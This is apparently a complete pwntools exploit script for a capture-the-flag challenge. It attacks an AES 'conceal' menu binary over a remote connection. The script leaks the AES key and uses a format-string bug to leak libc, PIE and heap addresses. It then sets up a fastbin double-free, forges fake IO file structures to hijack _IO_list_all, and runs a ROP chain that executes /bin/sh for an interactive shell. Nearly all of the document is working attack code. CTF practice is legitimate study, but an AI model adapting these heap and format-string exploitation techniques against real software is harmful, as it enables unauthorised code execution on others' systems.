from pwn import *
from binascii import hexlify,unhexlify
from Crypto.Cipher import AES
import struct
import os
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = '35.245.143.0'
PORT = 1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(['./ld-linux-x86-64.so.2', TARGET], env={"LD_PRELOAD":"./libc.so.6 ./libcrypto.so.1.0.0"})
        # return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def conceal(idx, size, text):
    r.sendlineafter('ID:', str(idx))
    r.sendlineafter('quest\n', '1')
    r.sendlineafter('size:\n', str(size))
    r.sendlineafter('plaintext:', text)
    r.recvuntil('concealed!\n')
    hex_ct = r.recvuntil('\n')[:-1]
    return hex_ct

def change(idx, enc_name, iv):
    r.sendlineafter('ID:', str(idx))
    r.sendlineafter('quest\n', '2')
    r.sendlineafter('name:', enc_name)
    r.sendlineafter('):', iv)

def remove(idx):
    r.sendlineafter('ID:', str(idx))
    r.sendlineafter('quest\n', '3')

while(1):
    r = start()

    r.recvuntil('IV:')
    hex_iv = r.recvuntil('\n')[:-1]
    iv = unhexlify(hex_iv)

    r.sendlineafter('code :', 'aaa')
    ct = conceal(2, 0x8, 'A')
    change(2, ct, iv)
    try:
        r.recvuntil('new name:')
        leak = r.recvuntil('Enter')
        key = leak[0x10:0x20]
        if len(hexlify(key)) != 0x20:
            r.close()
            continue
        break
    except:
        r.close()

# iv = leak[0x20:0x30]
print "KEY:", hexlify(key), len(key)
print "IV :", hexlify(iv), len(iv)

# leak libc and pie
pt = '%35$p'
pt += '\xff'*2
pt += '%34$p'
pt += '\xff'*2
pt += '\x02'*2

# 1. function "read_data" reads only 0x1f byte (in hex string). we can't fully input our block.
# 2. ct will be decrypted properly only if ct is in hex format and the last 2byte is like "0X".
#    (this bug is in the function "hextostring")
#    example:
#       a. last 2byte is "12" -> "read_data" recieve as "1" -> "hextostring" decode as "01"
#       b. last 2byte is "03" -> "read_data" recieve as "0" -> "hextostring" decode as "00"
#       c. last 2byte is "3x" -> "read_data" recieve as "3" -> "hextostring" decode as "03"
#
# 3. we have to search good iv that meets above condition. (like example c)
def search_iv(pt, key):
    ct = 'dummy'
    while (hexlify(ct)[-2] != '0'):
        random_iv = os.urandom(0x10)
        cipher = AES.new(key, AES.MODE_CBC, random_iv)
        ct = cipher.encrypt(pt)
    return ct, random_iv

# search good ct and iv
ct, random_iv = search_iv(pt, key)

# hexed ct
payload = hexlify(ct)

# strip "0"
payload = payload[:-2] + payload[-1]

# now payload length is 0x1f
change(1, payload, random_iv)

r.recvuntil('new name:')
leak = int(r.recvuntil('\xff\xff')[:-2], 16)
dbg('leak')
base = leak - 0x20840
dbg('base')
leak = int(r.recvuntil('\xff\xff')[:-2], 16)
dbg('leak')
pie = leak - 0x1a30
dbg('pie')


# leak heap
bss = pie + 0x203098
pt = '%7$sAAAA'
pt += p64(bss).strip('\x00')
pt += '\x02'*2

ct, random_iv = search_iv(pt, key)
payload = hexlify(ct)
payload = payload[:-2] + payload[-1]
change(1, payload, random_iv)

r.recvuntil('new name:')
leak = u64(r.recvuntil('AAAA')[:-4]+'\x00'*2)
dbg('leak')
heap = leak - 0x2490
dbg('heap')

io_list_all = base + 0x3c5520
setcontext = base + 0x47b50+0x35

syscall = base + 0x000bc3f5
rax = base + 0x0003a737
rdi = base + 0x0013e302
rsi = base + 0x0012ee05
rdx = base + 0x00115166

# make fastbindup with 0x70 sized chunk
conceal(3, 0x50, 'AAAA')
conceal(4, 0x50, 'BBBB')

remove(4)
remove(3)
remove(4)

# 1. text in chunk made with "conceal" is encrypted. 
# 2. this text is copy from stack to heap in "conceal" using strlen. 
# 3. "\x00" or "\x0a" will terminate our payload. so we have to search good ct this time.
# 4. we can't fill all aligned 16byte with fixed value because if there is one prohibited char in ct, it's over. this time, we can't use alternative iv.
#    example:
#       a. pt: p64(0xdeadbeef)+os.urandom(8) -> will find proper ct
#       b. pt: p64(0xdeadbeef)+p64(0xc0bebeef) -> can't search anymore
#       c. pt: p64(0xdeadbeef)+os.urandom(16)+p64(0xc0bebeef) -> will find proper ct
def search_ct(pt, iv, key):
    assert len(pt) % 0x10 == 0
    log.info("searching")
    ct = '\x00'
    while '\x00' in ct or '\x0a' in ct:
        payload = ''
        for i in range(0, len(pt), 8):
            if u64(pt[i:i+8]) == 0xdeadbeef:
                payload += os.urandom(8)
            else:   
                payload += pt[i:i+8]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ct = cipher.decrypt(payload) 
    log.info("done")
    return ct

# use fastbindup 
pt = flat(io_list_all-0x28+5, 0xdeadbeef)
ct = search_ct(pt, iv, key)
conceal(5, 0x50, ct)

# fake io struct 1
pt = p64(0xdeadbeef)*2
pt += '/bin/sh\x00'
pt += p64(0xdeadbeef)*2
pt += p64(setcontext)
pt += p64(0xdeadbeef)*2
ct = search_ct(pt, iv, key)
conceal(6, 0x50, ct)

# fake io struct 2
pt = flat(0xdeadbeef, heap+0x24c0)
pt += p64(0xdeadbeef)*6
pt += flat(heap+0x25a0, rdi+1)
ct = search_ct(pt, iv, key)
conceal(7, 0x50, ct)

# overwrite io_list_all to heap
pt = p64(heap+0x24c0)
log.info("searching")
ct = '\x00'
while '\x00' in ct or '\x0a' in ct:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.decrypt(os.urandom(0x13)+pt+os.urandom(0x5)) 
log.info("done")
conceal(8, 0x50, ct)

# build rop in 0x80 sized chunk
# (this is hard part because we can't search..)
log.info("hard part here. may be need reset....")
pt = flat(rdi, heap+0x24c0, rsi, 0, rdx, 0)
pt += flat(rax, 0x3b, syscall, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef)
ct = search_ct(pt, iv, key)
conceal(9, 0x60, ct)

if args.D:
    debug(r, [0x17d7])

# trigger io_flush_all
r.sendlineafter('ID:', '1')
r.sendlineafter('quest\n', '4')
r.sendafter('here?\n', 'win')

r.interactive()
r.close()
